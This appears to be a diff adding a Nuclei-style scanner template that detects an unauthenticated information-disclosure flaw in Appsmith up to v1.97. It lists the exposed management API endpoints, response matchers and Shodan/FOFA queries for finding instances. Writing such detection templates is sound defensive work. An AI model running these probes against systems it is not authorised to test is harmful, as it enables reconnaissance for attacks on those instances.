@@ -1,0 +1,82 @@
+id: appsmith-info-disclosure
+
+info:
+  name: Appsmith <= v1.97 - Information Disclosure
+  author: ritikchaddha
+  severity: medium
+  description: |
+    Appsmith <= v1.97 instance management API endpoints are accessible without authentication, allowing an attacker to obtain sensitive information such as license plan, instance ID, authentication providers, feature flags, and configuration metadata via unauthenticated requests to specific API endpoints.
+  impact: |
+    Attackers can extract detailed information about Appsmith enterprise features, authentication methods, and configuration, enabling more focused and effective attacks against the instance and its users.
+  remediation: |
+    Restrict unauthenticated access to the management API endpoints and ensure that only authorized users can retrieve sensitive configuration information.
+  reference:
+    - https://github.com/appsmithorg/appsmith/security/advisories/GHSA-qvvc-prjx-f85j
+    - https://github.com/appsmithorg/appsmith/pull/41598
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 4.3
+    cwe-id: CWE-200
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: appsmith
+    product: appsmith
+    shodan-query: http.title:"Appsmith"
+    fofa-query: title="Appsmith"
+  tags: appsmith,disclosure,exposure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/tenants/current"
+      - "{{BaseURL}}/api/v1/consolidated-api/view"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"adminEmailDomainHash":"'
+          - '"instanceId":"'
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - '{"responseMeta":{'
+          - 'status":200,"success":true'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/users/features"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"responseMeta":{'
+          - 'status":200,"success":true'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100f525107c3f23ef91fc114575d15cd2a6053a234598fb06d79a93942fc0a074a4022100af8f5cd0e989596c282ba4ccd13b0781ce0528111c0b13be8fdd97954cb898a3:922c64590222798bb761d5b6d8e72950
